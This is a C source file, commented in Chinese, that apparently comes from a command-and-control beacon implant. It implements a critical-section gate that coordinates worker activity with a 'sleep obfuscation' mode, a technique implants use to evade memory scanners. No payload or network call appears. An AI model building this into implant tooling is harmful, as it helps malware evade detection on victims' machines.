#include "beacon_context.h"
#include "beacon_runtime.h"

/* ===== RuntimeGate 生命周期 ===== */

/* 初始化运行时门控（清零 + 初始化临界区） */
VOID RuntimeGateInit(RuntimeGate* gate)
{
    if (!gate) return;

    ZeroMemory(gate, sizeof(*gate));
    gate->wake_event = CreateEventW(NULL, FALSE, FALSE, NULL);
    InitializeCriticalSection(&gate->lock);
}

/* 释放运行时门控（删除临界区 + 清零） */
VOID RuntimeGateFree(RuntimeGate* gate)
{
    if (!gate) return;

    if (gate->wake_event) {
        CloseHandle(gate->wake_event);
        gate->wake_event = NULL;
    }
    DeleteCriticalSection(&gate->lock);
    ZeroMemory(gate, sizeof(*gate));
}

/* ===== Worker 活跃计数 ===== */

/*
 * 请求开始一次 worker 活动
 * 仅当 sleep 混淆未激活且未挂起时才允许，返回 TRUE 并递增 active_count
 */
BOOL RuntimeActivityBegin(BeaconContext* ctx)
{
    RuntimeGate* gate;
    BOOL ok = FALSE;

    if (!ctx) return FALSE;

    gate = &ctx->runtime;

    EnterCriticalSection(&gate->lock);
    if (!gate->sleep_obf_pending && !gate->sleep_obf_active) {
        ++gate->active_count;
        ok = TRUE;
    }
    LeaveCriticalSection(&gate->lock);

    return ok;
}

/* 结束一次 worker 活动，递减 active_count */
VOID RuntimeActivityEnd(BeaconContext* ctx)
{
    RuntimeGate* gate;

    if (!ctx) return;

    gate = &ctx->runtime;

    EnterCriticalSection(&gate->lock);
    if (gate->active_count > 0) {
        --gate->active_count;
    }
    LeaveCriticalSection(&gate->lock);
}

/* ===== Sleep 混淆互斥 ===== */

/*
 * 请求进入 sleep 混淆模式
 * 先标记 pending；如果当前没有活跃 worker，则立即激活。
 * 如果已有 worker，则取消 pending 并让调用方回退普通 Sleep。
 */
BOOL RuntimeSleepObfBegin(BeaconContext* ctx)
{
    RuntimeGate* gate;
    BOOL ok = FALSE;

    if (!ctx) return FALSE;

    gate = &ctx->runtime;

    EnterCriticalSection(&gate->lock);

    /* 标记挂起状态 */
    gate->sleep_obf_pending = 1;

    /* 无活跃 worker 且未在混淆中 → 允许进入 */
    if (gate->active_count == 0 && !gate->sleep_obf_active) {
        gate->sleep_obf_active = 1;
        ok = TRUE;
    } else {
        /* 有活跃 worker → 取消挂起 */
        gate->sleep_obf_pending = 0;
    }

    LeaveCriticalSection(&gate->lock);

    return ok;
}

/* 退出 sleep 混淆模式，清除 active 和 pending 标志 */
VOID RuntimeSleepObfEnd(BeaconContext* ctx)
{
    RuntimeGate* gate;

    if (!ctx) return;

    gate = &ctx->runtime;

    EnterCriticalSection(&gate->lock);
    gate->sleep_obf_active  = 0;
    gate->sleep_obf_pending = 0;
    LeaveCriticalSection(&gate->lock);
}
